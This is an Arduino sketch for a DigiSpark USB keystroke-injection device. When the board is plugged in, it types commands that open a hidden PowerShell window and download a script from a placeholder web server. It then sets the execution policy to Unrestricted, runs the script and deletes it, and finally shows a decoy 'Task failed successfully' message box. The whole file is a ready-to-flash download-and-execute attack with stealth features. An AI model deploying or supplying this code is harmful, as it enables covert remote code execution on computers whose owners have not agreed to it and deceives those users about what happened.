//This DigiSpark scripts downloads and executes a powershell script in hidden mode.
#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("powershell.exe -windowstyle hidden");
  //DigiKeyboard.print("powershell.exe");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("$client = new-object System.Net.WebClient");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("$client.DownloadFile(\"http://your_webserver/ducky.ps1\" , \"ducky.ps1\")");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("cd $env:USERPROFILE");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false -Force");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print(".\\ducky.ps1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("del ducky.ps1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("Add-Type -AssemblyName PresentationFramework");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("[System.Windows.MessageBox]::Show(\"Task failed successfully\")");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  for (;;) {
    /*empty*/
  }
}
